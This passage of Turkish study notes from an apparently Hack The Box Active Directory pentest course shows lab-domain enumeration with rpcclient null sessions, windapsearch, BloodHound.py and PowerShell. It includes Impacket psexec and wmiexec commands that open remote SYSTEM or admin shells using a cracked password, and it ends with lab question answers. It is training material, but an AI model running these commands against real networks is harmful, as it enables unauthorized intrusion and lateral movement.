Recursive listeleme daha derinlere indikçe, size üst düzey dizinlerdeki tüm alt dizinlerin çıktısını gösterecektir. Sadece `--dir-only` kullanımı sadece tüm dizinlerin çıktısını sağlar ve tüm dosyaları listelemez. Bunu Domain Controller üzerindeki diğer paylaşımlarda deneyin ve ne bulabileceğinize bakın.

Paylaşımları ele aldığımıza göre, şimdi `RPCClient`'a bakalım.

## rpcclient
[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html), Samba protokolü ile kullanılmak ve MS-RPC aracılığıyla ekstra işlevsellik sağlamak için oluşturulmuş kullanışlı bir araçtır. AD'den nesneleri numaralandırabilir, ekleyebilir, değiştirebilir ve hatta kaldırabilir. Oldukça çok yönlüdür; tek yapmamız gereken başarmak istediğimiz şey için doğru komutu bulmaktır. Bunun için rpcclient için man sayfası çok faydalıdır; attack host'unuzun shell'ine `man rpcclient` yazın ve mevcut seçenekleri gözden geçirin. Şimdi bir sızma testi sırasında yardımcı olabilecek birkaç rpcclient işlevini ele alalım.  

Bazı hostlarımızdaki SMB NULL oturumları nedeniyle (parola püskürtme bölümlerinde ayrıntılı olarak ele alınmıştır), INLANEFREIGHT.LOCAL domaininde rpcclient kullanarak kimliği doğrulanmış veya doğrulanmamış numaralandırma gerçekleştirebiliriz. Kimliği doğrulanmamış bir bakış açısından rpcclient kullanımına bir örnek (bu yapılandırma hedef domainimizde mevcutsa) şöyle olacaktır:

```bash
rpcclient -U "" -N 172.16.5.5
```

Yukarıdakiler bize bağlı bir bağlantı sağlayacaktır ve rpcclient'ın gücünü açığa çıkarmaya başlamak için yeni bir komut istemiyle karşılanmalıyız.

#### SMB NULL Session with rpcclient
![Pasted image 20241019181352.png](/img/user/resimler/Pasted%20image%2020241019181352.png)

Buradan, herhangi bir sayıda farklı şeyi sıralamaya başlayabiliriz. Domain kullanıcıları ile başlayalım.

#### **rpcclient Numaralandırma**  

rpcclient'ta kullanıcılara bakarken, her kullanıcının yanında `rid:` adlı bir alan görebilirsiniz. [Göreceli Tanımlayıcı (RID)](“https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers”), Windows tarafından nesneleri izlemek ve tanımlamak için kullanılan benzersiz bir tanımlayıcıdır (onaltılık biçimde gösterilir). Bunun nasıl kullanıldığını açıklamak için aşağıdaki örneklere bakalım:

* INLANEFREIGHT.LOCAL domain'i için SID şöyledir: S-1-5-21-3842939050-3880317879-2865463114.  

- Bir domain içinde bir nesne oluşturulduğunda, yukarıdaki sayı (SID) nesneyi temsil etmek için kullanılan benzersiz bir değer oluşturmak üzere bir RID ile birleştirilecektir.  
    
- Dolayısıyla, RID:[0x457] Hex 0x457 = decimal `1111` olan `htb-student` domain kullanıcısı, tam bir kullanıcı SID'sine sahip olacaktır: `S-1-5-21-3842939050-3880317879-2865463114-1111`.  
    
- Bu, INLANEFREIGHT.LOCAL domainindeki `htb-student` nesnesine özgüdür ve bu eşleştirilmiş değeri bu domain veya başka bir domain içindeki başka bir nesneye bağlı olarak asla göremezsiniz.


Ancak, hangi hostta olursanız olun aynı RID'ye sahip olduğunu fark edeceğiniz hesaplar vardır. Bir domain için built-in Administrator gibi hesaplar RID [administrator] rid:[0x1f4] değerine sahip olacaktır; bu değer ondalık değere dönüştürüldüğünde `500`'e eşittir. Yerleşik Administrator hesabı her zaman `Hex 0x1f4` veya 500 RID değerine sahip olacaktır. Bu her zaman böyle olacaktır. Bu değer bir nesne için benzersiz olduğundan, domain'den nesne hakkında daha fazla bilgi almak için bu değeri kullanabiliriz. Bunu rpcclient ile tekrar deneyelim. `htb-student` kullanıcısını hedef alarak biraz araştırma yapacağız.


#### **RPCClient RID'ye Göre Kullanıcı Numaralandırma**
```shell-session
rpcclient $> queryuser 0x457

        User Name   :   htb-student
        Full Name   :   Htb Student
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT
        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x457
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000001d
        padding1[0..7]...
        logon_hrs[0..21]...
```

RID `0x457`'ye karşı `queryuser` komutunu kullanarak bilgi aradığımızda, RPC beklendiği gibi `htb-student` için kullanıcı bilgilerini döndürdü. Bu zor değildi çünkü `htb-student` için RID'yi zaten biliyorduk. Eğer birden fazla kullanıcının RID'lerini toplamak için tüm kullanıcıları listelemek isteseydik, `enumdomusers` komutunu kullanırdık.


#### Enumdomusers

![Pasted image 20241019182602.png](/img/user/resimler/Pasted%20image%2020241019182602.png)

Bu şekilde kullanmak, tüm alan kullanıcılarını ad ve RID'ye göre yazdıracaktır. Numaralandırma işlemimiz rpcclient kullanarak çok ayrıntılı olabilir. Kullanıcıları ve grupları düzenlemek ya da kendi kullanıcılarımızı domain'e eklemek gibi eylemler gerçekleştirmeye bile başlayabiliriz, ancak bu modülün kapsamı dışında. Şimdilik sadece bulgularımızı doğrulamak için domain numaralandırması yapmak istiyoruz. Diğer rpcclient işlevleriyle oynamak için biraz zaman ayırın ve ürettikleri sonuçları görün. SID'ler, RID'ler ve AD'nin diğer temel bileşenleri gibi konular hakkında daha fazla bilgi için [Active Directory'ye Giriş](https://academy.hackthebox.com/course/preview/introduction-to-active-directory) modülüne göz atmanız faydalı olacaktır. Şimdi, tüm ihtişamıyla Impacket'e dalma zamanı.


## **Impacket Toolkit**

Impacket, Windows protokollerini numaralandırmak, etkileşimde bulunmak ve istismar etmek ve Python kullanarak ihtiyacımız olan bilgileri bulmak için bize birçok farklı yol sağlayan çok yönlü bir araç setidir. Araç aktif olarak korunmaktadır ve özellikle yeni saldırı teknikleri ortaya çıktığında birçok katılımcısı vardır. Impacket ile başka birçok eylem gerçekleştirebiliriz, ancak bu bölümde sadece birkaçını vurgulayacağız; [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) ve [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). Zehirlenme bölümünün başlarında, `Responder` ile `wley` kullanıcısı için bir hash yakaladık ve `transporter@4` şifresini elde etmek için kırdık. Bir sonraki bölümde bu kullanıcının `ACADEMY-EA-FILE` hostunda lokal bir admin olduğunu göreceğiz. Sonraki birkaç eylem için kimlik bilgilerini kullanacağız.

#### **Psexec.py**  

Impacket paketindeki en kullanışlı araçlardan biri `psexec.py`'dir. Psexec.py, Sysinternals psexec çalıştırılabilir dosyasının bir kopyasıdır, ancak orijinalinden biraz farklı çalışır. Araç, hedef hosttaki `ADMIN$` paylaşımına rastgele adlandırılmış bir çalıştırılabilir dosya yükleyerek uzak bir hizmet oluşturur. Daha sonra servisi `RPC` ve `Windows Servis Kontrol Yöneticisi` aracılığıyla kaydeder. Bir kez kurulduktan sonra, iletişim adlandırılmış bir pipe üzerinden gerçekleşir ve kurban hostta `SYSTEM` olarak etkileşimli bir remote shell sağlar.


#### **psexec.py'yi kullanma**  

psexec.py ile bir host'a bağlanmak için local administrator ayrıcalıklarına sahip bir kullanıcının kimlik bilgilerine ihtiyacımız var.

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

![Pasted image 20241019183039.png](/img/user/resimler/Pasted%20image%2020241019183039.png)

Psexec modülünü çalıştırdığımızda, bizi hedef hosttaki `system32` dizinine bırakır. Doğrulamak için `whoami` komutunu çalıştırdık ve host'a `SYSTEM` olarak indiğimizi doğruladı. Buradan, bu host üzerinde herhangi bir görevi gerçekleştirebiliriz; daha fazla numaralandırmadan kalıcılığa ve yanal harekete kadar her şey. Başka bir Impacket modülünü deneyelim: `wmiexec.py`.

#### **wmiexec.py**  

Wmiexec.py, komutların [Windows Yönetim Araçları](“https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page”) aracılığıyla yürütüldüğü yarı etkileşimli bir shell kullanır. Hedef host üzerine herhangi bir dosya ya da çalıştırılabilir dosya bırakmaz ve diğer modüllere göre daha az log oluşturur. Bağlandıktan sonra, bağlandığımız local admin kullanıcısı olarak çalışır (bu, izinsiz giriş arayan biri için SYSTEM'in birçok komutu çalıştırdığını görmekten daha az belirgin olabilir). Bu, diğer araçlara göre hostlarda yürütme için daha gizli bir yaklaşımdır, ancak yine de çoğu modern anti-virüs ve EDR sistemi tarafından yakalanacaktır. Hosta erişmek için psexec.py ile aynı hesabı kullanacağız.


#### Using wmiexec.py
```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

![Pasted image 20241019183703.png](/img/user/resimler/Pasted%20image%2020241019183703.png)


Bu shell ortamının tam etkileşimli olmadığını unutmayın, bu nedenle verilen her komut WMI'dan yeni bir cmd.exe çalıştıracak ve komutunuzu yürütecektir. Bunun dezavantajı, uyanık bir savunucunun olay günlüklerini kontrol etmesi ve olay kimliği [4688](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)'e bakmasıdır [:](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688) [Yeni bir işlem oluşturuldu](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688), cmd.exe'yi ortaya çıkarmak ve bir komut vermek için yeni bir process oluşturulduğunu göreceklerdir. Birçok kuruluş bilgisayarları yönetmek için WMI kullandığından bu her zaman kötü niyetli bir faaliyet değildir, ancak bir soruşturmada ipucu olabilir. Yukarıdaki resimde, prosesin SYSTEM olarak değil, host üzerinde `wley` kullanıcısı bağlamı altında çalıştığı da açıkça görülmektedir. Impacket çok sayıda kullanım alanı olan son derece değerli bir araçtır. Bu modülün geri kalanında Impacket araç setindeki diğer birçok aracı göreceğiz. Windows host'larla çalışan bir pentester olarak bu araç her zaman cephaneliğimizde bulunmalıdır. Bir sonraki araç olan `Windapsearch`'e geçelim.


## **Windapsearch**  

[Windapsearch](“https://github.com/ropnop/windapsearch”), LDAP sorgularını kullanarak bir Windows domainindeki kullanıcıları, grupları ve bilgisayarları listelemek için kullanabileceğimiz başka bir kullanışlı Python betiğidir. Saldırı hostumuzun /opt/windapsearch/ dizininde mevcuttur.


#### Windapsearch Help
```shell-session
M1R4CKCK@htb[/htb]$ windapsearch.py -h
```

Windapsearch ile standart numaralandırma (kullanıcıları, bilgisayarları ve grupları dökme) ve daha ayrıntılı numaralandırma yapmak için çeşitli seçeneklerimiz vardır. Bu seçenekler `--da` (enumerate domain admins group members) ve `-PU` (find privileged users) seçenekleridir. `PU` seçeneği ilginçtir çünkü iç içe grup üyeliği olan kullanıcılar için özyinelemeli bir arama gerçekleştirir.

#### Windapsearch - Domain Admins

```shell-session
M1R4CKCK@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 u:INLANEFREIGHT\forend
[+] Attempting to enumerate all Domain Admins
[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]	Found 28 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

<SNIP>
```

Yukarıdaki shell'deki sonuçlardan, Domain Admins grubundan 28 kullanıcıyı listelediğini görebiliriz. Daha önce gördüğümüz ve hatta `wley`, `svc_qualys` ve `lab_adm` gibi bir hash veya cleartext parolaya sahip olabilecek birkaç kullanıcıya dikkat edin.  

Daha fazla potansiyel kullanıcıyı belirlemek için aracı `-PU` bayrağıyla çalıştırabilir ve fark edilmemiş olabilecek yükseltilmiş ayrıcalıklara sahip kullanıcıları kontrol edebiliriz. Bu, raporlama için harika bir kontroldür çünkü büyük olasılıkla müşteriyi iç içe grup üyeliğinden kaynaklanan aşırı ayrıcalıklara sahip kullanıcılar hakkında bilgilendirecektir.


#### Windapsearch - Privileged Users

```shell-session
$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```
```shell-session
[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as:
[+]      u:INLANEFREIGHT\forend
[+] Attempting to enumerate all AD privileged users
[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 28 nested users for group Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Angela Dunn
userPrincipalName: adunn@inlanefreight.local

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

cn: Dorothy Click
userPrincipalName: dclick@inlanefreight.local

<SNIP>

[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 3 nested users for group Enterprise Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Sharepoint Admin
userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL

<SNIP>
```

Farklı dillerdeki yaygın yükseltilmiş grup adlarına karşı mutasyonlar gerçekleştirdiğini fark edeceksiniz. Bu çıktı, iç içe geçmiş grup üyeliğinin tehlikelerine bir örnek vermektedir ve bunu görselleştirmek için BloodHound grafikleriyle çalıştığımızda bu daha belirgin hale gelecektir.

## Bloodhound.py
Domain kimlik bilgilerine sahip olduğumuzda, Linux atak hostumuzdan [BloodHound.py](“https://github.com/fox-it/BloodHound.py”) BloodHound ingestor'ını çalıştırabiliriz. BloodHound, Active Directory güvenliğini denetlemek için şimdiye kadar piyasaya sürülen en etkili araçlardan biri olmasa da biridir ve sızma testçileri olarak bizim için son derece faydalıdır. İncelenmesi zaman alacak büyük miktarda veriyi alıp belirli bir kullanıcı ile erişimin nereye varabileceğine dair grafiksel gösterimler ya da “saldırı yolları” oluşturabiliyoruz. Bir AD ortamında BloodHound GUI aracıyla sorgu çalıştırma ve sorunları görselleştirme becerisi olmadan gözden kaçabilecek incelikli kusurları sıklıkla bulacağız. Araç, ilişkileri görsel olarak temsil etmek ve diğer araçlarla tespit edilmesi zor, hatta imkansız olan saldırı yollarını ortaya çıkarmak için [grafik teorisini](https://en.wikipedia.org/wiki/Graph_theory) kullanır. Araç iki bölümden oluşmaktadır: Windows sistemlerinde kullanılmak üzere C# dilinde yazılmış [SharpHound toplayıcısı](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) ya da bu bölümde BloodHound.py toplayıcısı ( `ingestor` olarak da adlandırılmaktadır) ve toplanan verileri JSON dosyaları şeklinde yüklememizi sağlayan [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) GUI aracı. Yüklendikten sonra, önceden oluşturulmuş çeşitli sorguları çalıştırabilir veya [Cypher dilini](https://blog.cptjesus.com/posts/introtocypher) kullanarak özel sorgular yazabiliriz. Araç, AD'den kullanıcılar, gruplar, bilgisayarlar, grup üyeliği, GPO'lar, ACL'ler, domain güvenleri, local admin erişimi, kullanıcı oturumları, bilgisayar ve kullanıcı özellikleri, RDP erişimi, WinRM erişimi vb. gibi verileri toplar.

Başlangıçta yalnızca bir PowerShell kolektörü ile piyasaya sürüldü, bu nedenle bir Windows hostundan çalıştırılması gerekiyordu. Sonunda, bir Python portu (Impacket, `ldap3` ve `dnspython` gerektiren) bir topluluk üyesi tarafından yayınlandı. Bu, geçerli domain kimlik bilgilerine sahip olduğumuz, ancak domain'e bağlı bir Windows hostuna erişme hakkımız olmadığı veya SharpHound kollektörünü çalıştıracak bir Windows saldırı hostumuz olmadığı durumlarda penetrasyon testleri sırasında çok yardımcı oldu. Bu aynı zamanda kolektörü bir domain hostundan çalıştırmak zorunda kalmamamıza yardımcı olur, bu da potansiyel olarak engellenebilir veya uyarıları tetikleyebilir (saldırı hostumuzdan çalıştırmak bile iyi korunan ortamlarda büyük olasılıkla alarmları tetikleyecektir).  

Linux saldırı hostumuzdan `bloodhound-python -h komutunu` çalıştırmak bize mevcut seçenekleri gösterecektir.


#### BloodHound.py Options
```shell-session
$ bloodhound-python -h
```
Gördüğümüz gibi araç `-c` veya `--collectionmethod` bayrağı ile çeşitli toplama yöntemlerini kabul etmektedir. Kullanıcı oturumları, kullanıcılar ve gruplar, nesne özellikleri, ACLS gibi belirli verileri alabilir veya mümkün olduğunca çok veri toplamak için `tümünü` seçebiliriz. Bu şekilde çalıştıralım.


#### Executing BloodHound.py

```shell-session
M1R4CKCK@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 564 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 2951 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers

<SNIP>
```

Yukarıdaki komut Bloodhound.py dosyasını `forend` kullanıcısı ile çalıştırdı. Ad sunucumuzu `-ns` bayrağı ile Domain Controller olarak ve domain'i de `-d` bayrağı ile INLANEFREIGHt.LOCAL olarak belirttik. `c all` bayrağı araca tüm kontrolleri çalıştırmasını söyledi. Script tamamlandığında, mevcut çalışma dizininde <date_object.json> biçiminde çıktı dosyalarını göreceğiz.


#### **Sonuçları Görüntüleme**
```shell-session
M1R4CKCK@htb[/htb]$ ls

20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json  
```

#### **Zip Dosyasını BloodHound GUI'sine Yükleyin**  

Daha sonra `sudo neo4j start` yazarak [neo4j](“https://neo4j.com/”) servisini başlatabilir, verileri yükleyeceğimiz veritabanını çalıştırabilir ve Cypher sorgularını çalıştırabiliriz.  

Daha sonra, BloodHound GUI uygulamasını başlatmak ve verileri yüklemek için `freerdp` kullanarak oturum açtığımızda Linux atak hostumuzdan `bloodhound` yazabiliriz. Kimlik bilgileri Linux saldırı hostunda önceden doldurulmuştur, ancak herhangi bir nedenle bir kimlik bilgisi sorgusu gösterilirse, şunu kullanın:
- `user == neo4j` / `pass == HTB_@cademy_stdnt!`.

Yukarıdakilerin hepsi yapıldıktan sonra, BloodHound GUI aracını boş bir sayfa ile yüklemiş olmalıyız. Şimdi verileri yüklememiz gerekiyor. Her bir JSON dosyasını tek tek yükleyebilir ya da `zip -r ilfreight_bh.zip *.json` gibi bir komutla önce `zipleyebilir` ve Zip dosyasını yükleyebiliriz `.` Bunu pencerenin sağ tarafındaki `Upload Data` butonuna (yeşil ok) tıklayarak yapıyoruz. Bir dosya seçmek için dosya tarayıcı penceresi açıldığında, zip dosyasını (veya her bir JSON dosyasını) seçin (kırmızı ok) ve `Aç` düğmesine basın.

#### Uploading the Zip File
![Pasted image 20241019185502.png](/img/user/resimler/Pasted%20image%2020241019185502.png)
Artık veriler yüklendiğine göre, veritabanına karşı sorgular çalıştırmak için Analiz sekmesini kullanabiliriz. Bu sorgular, [özel Cypher sorgularını](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/) kullanarak karar verdiğiniz şeye özel ve spesifik olabilir. Burada bize yardımcı olacak birçok harika kopya sayfası vardır. Özel Cypher sorgularını daha sonraki bir bölümde daha fazla tartışacağız. Aşağıda görüldüğü gibi, pencerenin `Sol` tarafındaki `Analysis sekmesinde` yerleşik `Path Finding` sorgularını kullanabiliriz.

#### **İlişki Arayışı**
![Pasted image 20241019185811.png](/img/user/resimler/Pasted%20image%2020241019185811.png)
Yukarıdaki haritayı üretmek için seçilen sorgu `Domain Admins için En Kısa Yolları Bul` idi. Bize kullanıcılar/gruplar/ hostlar/ACL'ler/GPO'lar vb. aracılığıyla bulduğu mantıksal yolları, Domain Administrator ayrıcalıklarına veya eşdeğerine yükselmemizi sağlayacak ilişkileri verecektir. Bu, ağ üzerinden yanal hareket için sonraki adımlarımızı planlarken son derece yararlı olacaktır. Çeşitli özellikleri denemek için biraz zaman ayırın: verileri yükledikten sonra `Database Info` sekmesine bakın, `Domain Users` gibi bir düğüm arayın ve `Node Info` sekmesi altındaki tüm seçenekler arasında gezinin, `Analysis` sekmesi altındaki önceden oluşturulmuş sorgulara göz atın, bunların çoğu güçlüdür ve domain ele geçirmenin çeşitli yollarını hızla bulabilir. Son olarak, yukarıda bağlantısı verilen Cypher hile sayfasından bazı ilginç olanları seçerek, bunları alttaki `Raw Query` kutusuna yapıştırarak ve enter tuşuna basarak bazı özel Cypher sorgularını deneyin. Ayrıca ekranın sağ tarafındaki dişli simgesine tıklayıp düğümlerin ve kenarların nasıl görüntüleneceğini ayarlayarak, sorgu hata ayıklama modunu etkinleştirerek ve karanlık modu etkinleştirerek `Settings (Ayarlar` ) menüsüyle de oynayabilirsiniz. Bu modülün geri kalanında BloodHound'u çeşitli şekillerde kullanacağız, ancak BloodHound aracı hakkında özel bir çalışma için [Active Directory BloodHound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound) modülüne göz atın.

Bir sonraki bölümde, SharpHound toplayıcısını domain'e bağlı bir Windows host'tan çalıştırmayı ele alacağız ve BloodHound GUI'deki verilerle çalışmanın bazı örnekleri üzerinde çalışacağız.  

Bir Linux hostundan domain numaralandırma için birkaç yeni araç denedik. Aşağıdaki bölüm, domain bağlantılı bir Windows host'tan kullanabileceğimiz birkaç aracı daha kapsayacaktır. Kısa bir not olarak, eğer [WADComs projesine](https://wadcoms.github.io/) henüz göz atmadıysanız, kesinlikle göz atmalısınız. Bu modülde ele alacağımız birçok araç (ve daha fazlası) için etkileşimli bir kopya sayfasıdır. Komut sözdizimini tam olarak hatırlayamadığınızda veya bir aracı ilk kez denediğinizde son derece yararlıdır. Yer imlerine eklemeye ve hatta [katkıda](https://wadcoms.github.io/contribute/) bulunmaya değer!  

Şimdi, vites değiştirelim ve Windows atak hostumuzdan INLANEFREIGHT.LOCAL domainini incelemeye başlayalım.


Soru : Hangi AD Kullanıcısının RID değeri Ondalık 1170'e eşittir?
cevap : mmorgan
![Pasted image 20241019191232.png](/img/user/resimler/Pasted%20image%2020241019191232.png)

![Pasted image 20241019191055.png](/img/user/resimler/Pasted%20image%2020241019191055.png)



Soru : “Interns” grubunun üye sayısı nedir?
Cevap : 
![Pasted image 20241019191412.png](/img/user/resimler/Pasted%20image%2020241019191412.png)
![Pasted image 20241019191636.png](/img/user/resimler/Pasted%20image%2020241019191636.png)



# **Kimlik Bilgileri Numaralandırma - Windows'tan**
Önceki bölümde, Linux atak hostumuzdan geçerli domain kimlik bilgileriyle numaralandırma yapmak için kullanabileceğimiz bazı araçları inceledik. Bu bölümde, SharpHound/BloodHound, PowerView/SharpView, Grouper2, Snaffler ve AD numaralandırması için yararlı bazı yerleşik araçlar gibi bir Windows saldırısı hostundan numaralandırma için birkaç araç deneyeceğiz. Bu aşamada topladığımız bazı veriler, doğrudan saldırı yollarına yönlendirmek yerine raporlama için daha fazla bilgi sağlayabilir. Değerlendirme türüne bağlı olarak, müşterimiz tüm olası bulgularla ilgilenebilir, bu nedenle BloodHound'u serbestçe çalıştırma yeteneği veya belirli kullanıcı hesabı öznitelikleri gibi konular bile raporumuza orta riskli bulgular veya ayrı bir ek bölümü olarak dahil edilmeye değer olabilir. Ortaya çıkardığımız her sorun saldırılarımızı ilerletmeye yönelik olmak zorunda değildir. Bazı sonuçlar doğası gereği bilgilendirici olabilir, ancak güvenlik duruşlarını iyileştirmeye yardımcı olmak için müşteri için yararlı olabilir.

Bu noktada, yanal ve dikey harekete yol açabilecek diğer yanlış yapılandırmalar ve izin sorunlarıyla ilgileniyoruz. Ayrıca domainin nasıl kurulduğuna dair daha büyük bir resim elde etmek istiyoruz, yani mevcut ormanın içinde ve dışında diğer domainlerle herhangi bir güven ilişkisi var mı? Ayrıca, erişimimizi ilerletmek için kullanılabilecek kimlik bilgileri gibi hassas veriler içerdiğinden, kullanıcımızın erişebildiği dosya paylaşımlarını yağmalamakla da ilgileniyoruz.

## TTPs
Keşfedeceğimiz ilk araç [ActiveDirectory PowerShell modülüdür](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps). Domain'deki bir Windows host'una, özellikle de bir yöneticinin kullandığı bir host'a girdiğinizde, host üzerinde değerli araçlar ve komut dosyaları bulma şansınız vardır.

## **ActiveDirectory PowerShell Modülü**  

ActiveDirectory PowerShell modülü, Active Directory ortamını komut satırından yönetmek için kullanılan bir grup PowerShell cmdlet'idir. Yazım sırasında 147 farklı cmdlet'ten oluşmaktadır. Burada hepsini ele alamayız, ancak AD ortamlarını numaralandırmak için özellikle yararlı olan birkaç tanesine bakacağız. Bu bölüm için oluşturulan laboratuvarda modülde yer alan diğer cmdlet'leri keşfetmekten çekinmeyin ve ne tür ilginç kombinasyonlar ve çıktılar oluşturabileceğinizi görün.  

Modülü kullanabilmemiz için önce içe aktarıldığından emin olmamız gerekir. [Microsoft.PowerShell.Core modülünün](“https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/?view=powershell-7.2”) bir parçası olan [Get-Module](“https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-module?view=powershell-7.2”) cmdlet'i, mevcut tüm modülleri, sürümlerini ve kullanım için olası komutları listeleyecektir. Bu, Git veya özel yönetici komut dosyaları gibi herhangi bir şeyin yüklü olup olmadığını görmek için harika bir yoldur. `Modül` yüklenmemişse, kullanmak üzere yüklemek için `Import-Module ActiveDirectory` 'yi çalıştırın.

#### **Modülleri Keşfedin**
```powershell-session
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}

Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
```

ActiveDirectory modülünün henüz içe aktarılmadığını göreceğiz. Devam edelim ve içe aktaralım.


#### Load ActiveDirectory Module

```powershell-session
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...

Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}

Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS... 
```


Artık modüllerimiz yüklendiğine göre başlayalım. İlk olarak, [Get-ADDomain](“https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addomain?view=windowsserver2022-ps”) cmdlet'i ile domain hakkında bazı temel bilgileri listeleyeceğiz.

### Get Domain Info
```powershell-session
PS C:\htb> Get-ADDomain

AllowedDNSSuffixes                 : {}
ChildDomains                       : {LOGISTICS.INLANEFREIGHT.LOCAL}
ComputersContainer                 : CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
DeletedObjectsContainer            : CN=Deleted Objects,DC=INLANEFREIGHT,DC=LOCAL
DistinguishedName                  : DC=INLANEFREIGHT,DC=LOCAL
DNSRoot                            : INLANEFREIGHT.LOCAL
DomainControllersContainer         : OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-3842939050-3880317879-2865463114
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,DC=LOCAL
Forest                             : INLANEFREIGHT.LOCAL
InfrastructureMaster               : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {cn={DDBB8574-E94E-4525-8C9D-ABABE31223D0},cn=policies,cn=system,DC=INLANEFREIGHT,
                                     DC=LOCAL, CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=INLAN
                                     EFREIGHT,DC=LOCAL}
LostAndFoundContainer              : CN=LostAndFound,DC=INLANEFREIGHT,DC=LOCAL
ManagedBy                          :
Name                               : INLANEFREIGHT
NetBIOSName                        : INLANEFREIGHT
ObjectClass                        : domainDNS
ObjectGUID                         : 71e4ecd1-a9f6-4f55-8a0b-e8c398fb547a
ParentDomain                       :
PDCEmulator                        : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=INLANEFREIGHT,DC=LOCAL
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL}
RIDMaster                          : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
SubordinateReferences              : {DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=ForestDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL}
